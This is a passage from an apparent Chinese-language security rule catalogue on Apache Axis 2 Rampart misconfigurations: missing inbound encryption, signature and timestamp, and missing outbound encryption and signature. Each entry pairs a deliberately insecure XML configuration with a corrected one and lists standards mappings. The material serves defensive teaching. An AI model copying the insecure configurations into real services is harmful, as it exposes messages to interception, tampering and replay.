<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Encryption"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Encryption" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Inbound Encryption"></a>Axis 2 Service Provider Misconfiguration: Missing Inbound Encryption</h4><h5 id="ABSTRACT-145"><a href="#ABSTRACT-145" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-146"><a href="#EXPLANATION-146" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>下列 Apache Axis 2 Rampart 配置不要求对输入的消息进行加密，因为 <code>&lt;items&gt;</code>标签不包含 Encrypt 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-145"><a href="#RECOMMENDATIONS-145" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为只接受加密的消息。在 <code>&lt;items&gt;</code> 标签中添加 Encrypt 指令，便可完成此配置。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-144"><a href="#REFERENCES-144" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Signature"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Signature" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Inbound Signature"></a>Axis 2 Service Provider Misconfiguration: Missing Inbound Signature</h4><h5 id="ABSTRACT-146"><a href="#ABSTRACT-146" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果消息未经签名，则无法保证其完整性。</p>
<h5 id="EXPLANATION-147"><a href="#EXPLANATION-147" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中未经签名的任何部分，都可能在接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码验证消息内容是否可信赖。</p>
<p>下列服务提供程序配置可让 Axis 2 接受未经签名的消息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-146"><a href="#RECOMMENDATIONS-146" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的请求验证签名。</p>
<p>下列服务提供程序配置可让 Axis 2 验证签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-145"><a href="#REFERENCES-145" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Inbound-Timestamp" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Inbound Timestamp"></a>Axis 2 Service Provider Misconfiguration: Missing Inbound Timestamp</h4><h5 id="ABSTRACT-147"><a href="#ABSTRACT-147" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，将使 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-148"><a href="#EXPLANATION-148" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列 Apache Axis 2 Rampart 配置的<code>&lt;items&gt;</code> 标签中缺少 Timestamp 指令，因此该服务不要求请求中包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-147"><a href="#RECOMMENDATIONS-147" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为要求输入的请求具有时间戳。 下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code>标签中包含 Timestamp 指令，因此该服务要求所有请求中都包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-146"><a href="#REFERENCES-146" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Encryption" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Outbound Encryption"></a>Axis 2 Service Provider Misconfiguration: Missing Outbound Encryption</h4><h5 id="ABSTRACT-148"><a href="#ABSTRACT-148" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-149"><a href="#EXPLANATION-149" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<p>下列 Apache Axis 2 Rampart 配置不要求对输出的消息进行加密，因为 <code>&lt;items&gt;</code> 标签不包含 Encrypt 指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-148"><a href="#RECOMMENDATIONS-148" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为只发送加密的消息。在 <code>&lt;items&gt;</code>标签中添加 Encrypt 指令，便可完成此配置。 例如，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Encrypt 指令放在末尾，可确保其前面的任何内容都得到加密。在上例中，时间戳和签名都将被加密。</p>
<h5 id="REFERENCES-147"><a href="#REFERENCES-147" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Signature" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Outbound Signature"></a>Axis 2 Service Provider Misconfiguration: Missing Outbound Signature</h4><h5 id="ABSTRACT-149"><a href="#ABSTRACT-149" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-150"><a href="#EXPLANATION-150" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码验证消息内容的完整性或来源。</p>
<p>下列服务提供程序配置可让 Axis 2 发送未经签名的时间戳：</p>
